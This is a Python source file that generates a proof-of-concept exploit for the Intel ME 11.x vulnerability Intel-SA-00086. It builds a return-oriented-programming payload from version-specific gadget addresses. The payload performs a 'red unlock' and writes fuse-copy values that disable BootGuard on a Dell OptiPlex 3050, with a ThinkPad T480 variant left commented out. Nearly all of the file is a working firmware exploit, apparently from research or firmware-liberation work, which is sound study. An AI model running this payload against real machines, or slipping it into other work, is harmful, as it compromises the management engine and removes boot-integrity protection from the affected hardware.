# SPDX-License-Identifier: MIT
# Intel-SA-00086 exploit generator by  Mark Ermolov (@_markel___), Maxim Goryachy (@h0t_max)
# Port to ME 11.x by Youness Alaoui (@KaKaRoToKS)
# Refactored and BootGuard disable support added by Mate Kukri in 2024

from __future__ import print_function
import argparse
import struct

descr = "Intel-SA-00086 PoC for ME 11.x"

class MeInfo:
    def __init__(self,
                 version,
                 pch_type,
                 stack_top,
                 ct_data_offset,
                 memcpy_ret_offset,
                 syslib_addr,
                 syslib_size,
                 pop_esp_addr,
                 num_shmem_desc,
                 write_selector,
                 dfx_agg_sel,
                 infinite_loop,
                 pop_6,
                 write_edx_and_pop_3,
                 pop_3,
                 scripts_second_array,
                 init_tracehub_array_idx,
                 retaddr_init_tracehub,
                 retaddr_run_scripts,
                 retaddr_bup_main,
                 fpf_sram_copy_addr):
        self.ME_VERSION = version
        self.PCH_TYPE = pch_type
        self.STACK_TOP = stack_top
        self.BUFFER_OFFSET = ct_data_offset
        self.SYSLIB_ADDRESS = syslib_addr
        self.SYSLIB_SIZE = syslib_size
        self.TARGET_ADDRESS = self.STACK_TOP - memcpy_ret_offset
        self.POP_ESP_ADDRESS = pop_esp_addr
        self.BUP_THREAD_ID = 0x03000300
        self.NUM_SHMEM_DESC = num_shmem_desc
        self.ROP_ADDRESS = self.STACK_TOP - self.BUFFER_OFFSET
        self.write_selector = write_selector
        self.dfx_agg_sel = dfx_agg_sel
        self.infinite_loop = infinite_loop
        self.pop_6 = pop_6
        self.write_edx_and_pop_3 = write_edx_and_pop_3
        self.pop_3 = pop_3
        self.scripts_second_array = scripts_second_array
        self.init_tracehub_array_idx = init_tracehub_array_idx
        self.retaddr_init_tracehub = retaddr_init_tracehub
        self.retaddr_run_scripts = retaddr_run_scripts
        self.retaddr_bup_main = retaddr_bup_main
        self.fpf_sram_copy_addr = fpf_sram_copy_addr

ME_INFOS = [
    MeInfo(
            version="11.6.0.1126",
            pch_type="H",
            stack_top=0x63000,
            ct_data_offset=0x380,
            memcpy_ret_offset=0x974,
            syslib_addr=0x862F4,
            syslib_size=0x220,
            pop_esp_addr=0x1436F,
            num_shmem_desc=16,
            write_selector=0x11B9,
            dfx_agg_sel=0x1A7,
            infinite_loop=0xbd85,
            pop_6=0xe9d0,
            write_edx_and_pop_3=0xD1BF,
            pop_3=0xD1C1,
            scripts_second_array=0x5AB88,
            init_tracehub_array_idx=3,
            retaddr_init_tracehub=0x381D4,
            retaddr_run_scripts=0x36CBC,
            retaddr_bup_main=0x310A1,
            fpf_sram_copy_addr=0x85274,
        ),
        MeInfo(
            version="11.6.0.1126",
            pch_type="LP",
            stack_top=0x63000,
            ct_data_offset=0x380,
            memcpy_ret_offset=0x974,
            syslib_addr=0x872F4,
            syslib_size=0x220,
            pop_esp_addr=0x1baf6,
            num_shmem_desc=16,
            write_selector=0x11B9,
            dfx_agg_sel=0x1A7,
            infinite_loop=0xBD8D,
            pop_6=0xE9D8,
            write_edx_and_pop_3=0xD1C7,
            pop_3=0xD1C9,
            scripts_second_array=0x5A7FC,
            init_tracehub_array_idx=3,
            retaddr_init_tracehub=0x381D4,
            retaddr_run_scripts=0x36CBC,
            retaddr_bup_main=0x310A1,
            fpf_sram_copy_addr=0x86270,
        ),
]

def rop(addr):
    return struct.pack("<L", addr)

# Return current stack address with an offset above the stack
# useful to build rop independent ebp
def rop_address(me_info, rops, skip=0):
    return rop(me_info.ROP_ADDRESS + len(rops) + (skip * 4))

def gen_write_rop(me_info, addr, val):
    rops = b""

    # Set edx and ecx in preparation for the mem write
    rops += rop(me_info.pop_6)                          # pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret
    rops += rop(addr)                                   # target address (edx)
    rops += rop(val)                                    # value to write (ecx)
    rops += rop(0)*4                                    # Unused (ebx, esi, edi, edi)

    # Write ecx value into address pointed by edx
    rops += rop(me_info.write_edx_and_pop_3)            # mov [edx], ecx; pop ebx; pop esi; pop ebp; ret
    rops += rop(0)*3

    return rops

def GenerateRops(me_info):
    rops = b""

    ### START - bootguard disable rops for Dell OptiPlex 3050
    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x02fe3d71)
    ### END - bootguard disable rops

    ### START - bootguard disable rops for Lenovo ThinkPad T480
    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x021A39B0)
    ### END - bootguard disable rops

    ### START - red unlock
    rops += rop(me_info.write_selector)                 # write_sideband_port
    rops += rop(me_info.pop_3)                          # remove 3 arguments
    rops += rop(me_info.dfx_agg_sel)                    # param 1 - selector
    rops += rop(0)                                      # param 2 - offset
    rops += rop(0x3)                                    # param 3 - value
    ### END - red unlock

    # Set edx and ecx in preparation for the mem write and set edi for later
    rops += rop(me_info.pop_6)                          # pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret
    rops += rop(me_info.STACK_TOP - 0x10)               # syslib pointer in TLS (edx)
    rops += rop(me_info.SYSLIB_ADDRESS)                 # syslib address (ecx)
    rops += rop(0)*2                                    # Unused (ebx, esi)
    rops += rop(me_info.scripts_second_array)           # second array address (edi)
    rops += rop(0)                                      # Unused (ebp)

    # Write ecx value into address pointed by edx
    # We also restore the ebx, esi, and ebp registers for the bup_run_scripts function (edi is set in previous ROP gadget)
    rops += rop(me_info.write_edx_and_pop_3)            # mov [edx], ecx; pop ebx; pop esi; pop ebp; ret
    rops += rop(0)                                      # script index (ebx)
    rops += rop(me_info.init_tracehub_array_idx)        # second array index (esi)
    rops += rop_address(me_info, rops, 6)               # set EBP to 6 DWORDs above in the stack

    # Return to bup_run_init_scripts
    rops += rop(me_info.retaddr_init_tracehub)          # continue bup initialization after call to bup_init_trace_hub
    rops += rop(0)*4                                    # 4 registers pushed into the stack by bup_run_init_scripts (edi, esi, ebx,var_10)
    rops += rop_address(me_info, rops, 3)               # set EBP to 3 DWORDs above in the stack

    # Return to bup_main
    rops += rop(me_info.retaddr_run_scripts)            # continue initialization after call to bup_run_init_scripts
    rops += rop(0)                                      # value pushed into the stack
    rops += rop(0)                                      # Irrelevant EBP value

    # Return to bup_entry
    rops += rop(me_info.retaddr_bup_main)               # continue initialization after call to bup_main

    return rops


def GenerateSyslibCtx(me_info, syslib_ctx_addr):
    shmem_descs = b""
    for i in range(me_info.NUM_SHMEM_DESC):
        shmem_descs += struct.pack("<LLLLL", 0x1, me_info.TARGET_ADDRESS - me_info.BUFFER_OFFSET, me_info.BUFFER_OFFSET + 0x40, 0, 0)
    syslib_ctx_addr -= 0x90
    syslib_ctx = struct.pack("<LL", syslib_ctx_addr + 0x98, me_info.NUM_SHMEM_DESC)
    syslib_ctx += shmem_descs
    return (syslib_ctx, syslib_ctx_addr)

# ROPS
# syslib_ctx < shared mem ptr > pointing to valid descriptors below
# shared mem descriptors with address of memcpy_s ret address
# up to 0x380 with syslib context pointing up
# chunk with pointers to ROP address

def GenerateShellCode(version, pch_type):
    me_info = None
    for info in ME_INFOS:
        if info.ME_VERSION == version and info.PCH_TYPE == pch_type:
            me_info = info
            break

    if me_info is None:
        print("Cannot find required information for ME version and PCH type.")
        return None

    print(f"[*] ME version: {version}, PCH type: {pch_type}")
    print(f"[*] Generating Shell code(Stack top: {me_info.STACK_TOP:#x}, "
          + f"Buffer offset: {me_info.BUFFER_OFFSET:#x}, "
          + f"Target : {me_info.TARGET_ADDRESS:#x})...")

    # Add ROPs
    data = GenerateRops(me_info)

    # Create syslib context and add it to the data
    syslib_ctx_addr = me_info.ROP_ADDRESS + len(data)
    (syslib_ctx, syslib_ctx_addr) = GenerateSyslibCtx(me_info, syslib_ctx_addr)
    data += syslib_ctx

    # Create TLS structure
    tls = struct.pack("<LLLLL", 0, syslib_ctx_addr, 0, me_info.BUP_THREAD_ID, me_info.STACK_TOP-4)
    if len(data) + len(tls) > me_info.BUFFER_OFFSET:
        print("Too much data in the ROPs, cannot fit payload within 0x%X bytes" % me_info.BUFFER_OFFSET)
        return None

    # Add padding and add TLS at the end of the buffer
    data += struct.pack("<B", 0x0)*(me_info.BUFFER_OFFSET - len(data) - len(tls))
    data += tls
    
    # Could put ROPs here, but if it's more than one chunk, we wouldn't be able to get the full content.
    # So we just put a 'pop esp' with the ROP address into our chunk (bootstarting ROP).
    data += struct.pack("<LL", me_info.POP_ESP_ADDRESS, me_info.ROP_ADDRESS)*8
    return data

def ParseArguments():
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct")
    parser.add_argument('-v', metavar='<ME version>', help='ME version', type=str, default="11.6.0.1126")
    parser.add_argument('-p', metavar='<PCH type>', help='PCH type', type=str, default="H")
    return parser.parse_args()

def main():
    print(descr)
    args = ParseArguments()
    data = GenerateShellCode(args.v, args.p)
    if data:
        print("[*] Saving to %s..." % (args.f))
        with open(args.f, "wb") as f:
            f.write(data)
    
if __name__=="__main__":
    main()
